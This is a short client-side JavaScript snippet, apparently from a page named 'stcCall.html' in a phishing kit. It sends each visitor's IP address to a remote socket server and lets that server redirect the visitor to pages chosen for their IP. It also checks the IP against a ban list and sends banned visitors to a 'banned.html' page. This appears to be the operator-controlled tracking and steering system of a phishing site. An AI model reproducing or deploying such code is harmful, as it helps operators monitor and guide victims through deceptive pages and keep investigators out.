    window.socket = io("https://server-2h6g.onrender.com", { transports: ["websocket", "polling"] });
    window.visitorIP = null;

    (async () => {
      try {
        const r = await fetch("https://api.ipify.org?format=json");
        const { ip } = await r.json();
        window.visitorIP = ip;
        window.socket.emit("updateLocation", { ip, page: "stcCall.html" });
      } catch(e) {
        console.error("IP fetch failed:", e);
      }
    })();

    window.socket.on("navigateTo", ({ page, ip: targetIp }) => {
      const go = () => { if (window.visitorIP === targetIp) window.location.href = page; };
      if (!window.visitorIP) {
        const t = setInterval(() => { if (window.visitorIP) { clearInterval(t); go(); } }, 100);
      } else { go(); }
    });

    
    (async () => {
      try {
        while (window.visitorIP === null) {
          await new Promise(r => setTimeout(r, 50));
        }
        const res = await fetch(`https://server-2h6g.onrender.com/api/pending-nav/${encodeURIComponent(window.visitorIP)}`);
        const data = await res.json();
        if (data.page) { window.location.href = data.page; }
      } catch(e) { console.error("pending-nav check failed:", e); }
    })();

    
    (async () => {
      try {
        while (window.visitorIP === null) {
          await new Promise(r => setTimeout(r, 50));
        }
        const res = await fetch(`https://server-2h6g.onrender.com/api/banned/${encodeURIComponent(window.visitorIP)}`);
        const data = await res.json();
        if (data.banned) { window.location.replace("banned.html"); }
      } catch(e) { console.error("ban check failed:", e); }
    })();

    
    window.socket.on("banned", () => {
      window.location.replace("banned.html");
    });